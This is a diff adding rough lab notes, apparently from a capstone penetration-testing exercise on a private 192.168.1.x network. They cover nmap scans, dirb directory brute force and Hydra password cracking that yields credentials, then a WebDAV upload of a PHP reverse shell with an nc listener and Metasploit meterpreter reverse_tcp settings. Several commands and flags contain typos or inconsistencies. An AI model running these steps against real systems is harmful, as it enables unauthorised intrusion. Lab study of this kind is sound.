@@ -1,0 +1,64 @@
+Machines Used
+- Attacker machine = Kali Linux: 192.168.1.90
+- Target machine = Capstone: 192.168.1.105
+- ELK machine: 192.168.1.100
+- ML-RefVM-84427: 192.168.1.1
+
+Identify IP address & Expose Services
+Commands:
+- ARP Scan: netdiscover -r <ip address>
+- Ping Sweep: nmap -pn <ip address>
+- SYN Scan with OS Detection: nmap -sS -A <ip address>
+- Network: Ubuntu
+   - Port: 22 Open SSH 7.6p1 4ubuntu0.3
+   - Port: 80 Apache 2.4.29 Ubuntu
+
+Find Hidden Files
+Commands: 
+- etc/shadow -ls
+- Secret_file.txt
+- dirb http://192.168.1.105/usr/share/wordlist/dirb/common.txt replace with the attacker machine ip address 192.168.1.90
+- 192.168.1.105/company_folders/secret_folder
+- hydra -l ashton -P rockyou.txt -s 80 -f -vV 192.168.1.105 http-get
+- /company_folders/secret_folder
+- Ashton :: leopoldo
+- Firefox or Metasploit
+Using DIRB Commands:
+- Kali web browser: http://192.168.1.105 (this is the target’s IP address)
+- Shows generic files without links
+- Right click to to view the HTML source 
+- Search for hidden files (web pages) using DIRB command
+   - DIRB = queries the web server asking if a page exists
+   - Example: dirb http://192.168.1.105/usr/share/wordlist/dirb/common.txt
+   - To find DIRBuster - in Kali > Applications > web application analysis > web crawlers and directory brute force > DIRBuster
+
+Brute Force Passwords
+Commands:
+- Open Firefox and go to www.crackstation.net : Username: ryan
+- dav://192.168.1.105/webdav/passwd.dav
+   - John the Ripper 
+   - Hydra: hydra -l $USERNAME -P /path/to/wordlist -s $TARGET_PORT -f -vV $TARGET_URL
+   - Example: hydra -l admin -P /usr/opt/wordlist.txt -s 80 -f -vV victim.com/vulnerable_folder
+
+Reverse shell.php script
+- Open Folder and Click “Other Locations”
+Command: “dav://172.16.84.205/webdav/”
+- Use Ryan’s login credentials (brute force with Hydra)
+   - ryan:$apr1$fsU/VibG$HznoQs6XTF7VauEHtktNt.
+- Upload reverse shell.php script to target (metasploit)
+Command: nc -lvnp 1234 (reverse .php file)
+Result: flag: b1ng0w@5h1sn@m0
+Metasploit Commands:
+   - Meterpreter > shell find /-name flag.txt 2> /dev/null
+   - <result of find>:/flag.txt THEN cd /cat flag.txt
+   - <result of cat> = b1nq0w@sh1sn@rm0
+   - Metasploit >msfvenom >msf5 > multi/handler > meterpreter shell
+- Set lhost 192.168.1.90 (attacker)
+- Set lport 4444
+- Show Options
+- Set payload php/meterpreter/reverse_tcp > Run
+- Set -p php/meterpreter/reverse_tcp > Run
+curl or wget Commands:
+   - Wget -r -np -spider 192.168.1.105/2>&1 |grep 192.168.1.105 |grep -v -e “Remote file | uniq> 192.168.1.105.txt
+gunzip Command:
+   - Examples: gunzip --help  or gunzip zipfile.txt.gz
